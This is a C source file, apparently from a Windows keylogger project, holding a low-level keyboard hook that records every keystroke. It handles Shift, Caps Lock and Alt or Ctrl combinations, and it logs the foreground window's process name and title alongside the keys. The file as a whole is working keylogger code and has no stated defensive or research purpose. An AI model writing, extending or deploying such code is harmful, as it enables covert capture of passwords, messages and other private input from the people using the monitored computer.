#include "winkey.h"

LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Check if the hook should process the event
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;  // Pointer to the keyboard event data
        char key[32] = { 0 };  // Buffer to store the key or key combination

        // Retrieve the current state of all virtual keys
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        // Check if Shift is pressed and if Caps Lock is active
        BOOL isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        BOOL isCapsLockOn = GetKeyState(VK_CAPITAL) & 0x0001;

        // Check if the key is a printable character or a special key
        if ((pKeyboard->vkCode >= 0x30 && pKeyboard->vkCode <= 0x5A) ||  // Alphanumeric keys
            pKeyboard->vkCode >= VK_OEM_1 && pKeyboard->vkCode <= VK_OEM_102 ||  // OEM keys (e.g., punctuation)
            pKeyboard->vkCode >= VK_NUMPAD0 && pKeyboard->vkCode <= VK_DIVIDE || // Numpad keys
            pKeyboard->vkCode == VK_SPACE) {  // Space key
            // Get the character representation of the key
            strcpy(key, get_character(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, isShiftPressed, isCapsLockOn));
        }
        else {  // The key is a special key (e.g., F1, Tab)
            // Get the special key name (e.g., "[Enter]", "[Tab]")
            strcpy(key, get_special_key_name(pKeyboard->vkCode));
        }

        // If no key was identified, pass the event to the next hook
        if (strcmp(key, "") == 0) {
            return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
        }

        // Handle key combinations (e.g., Alt+C, Ctrl+X)
        char tmp_key[32] = { 0 };
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {  // If Alt key is pressed
            remove_brackets(key);  // Remove brackets from key name if any
            sprintf(tmp_key, "[Alt+%s]", key);  // Format the key combination as "Alt+key"
            strcpy(key, tmp_key);  // Update key with the combination
        }
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {  // If Ctrl key is pressed
            remove_brackets(key);  // Remove brackets from key name if any
            sprintf(tmp_key, "[Ctrl+%s]", key);  // Format the key combination as "Ctrl+key"
            strcpy(key, tmp_key);  // Update key with the combination
        }

        // Write the key or key combination to the log file
        write_to_log(key);
    }

    // Pass the event to the next hook in the chain
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

void CALLBACK handle_fg_window_change(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hwnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime
)
{
    (void)hWinEventHook, event, idObject, idChild, idEventThread, dwmsEventTime;

    // Get the extended window style to check the type of the window
    LONG_PTR exStyle = GetWindowLongPtr(hwnd, GWL_EXSTYLE);

    // Check if the window is a tool window (often used for floating palettes, etc.)
    // This is added to avoid logging "Task Switching" when using ALT+TAB
    if (exStyle & WS_EX_TOOLWINDOW) {
        // If the window is a tool window, it's likely not the main application window
        return;
    }

    // Update the global variable with the current foreground window handle
    g_foreground_window = hwnd;

    // Retrieve the process ID associated with the foreground window
    DWORD pid;
    GetWindowThreadProcessId(g_foreground_window, &pid);

    // Open the process to obtain its executable name
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (process) {
        // Get the full path to the executable file of the process
        // and then extract just the file name from the full path
        GetModuleFileNameEx(process, NULL, g_process_name, MAX_PATH);
        strcpy(g_process_name, PathFindFileName(g_process_name));

        CloseHandle(process);
    }

    // Get the title of the foreground window and store it in the global variable
    GetWindowText(hwnd, g_window_title, sizeof(g_window_title));
}
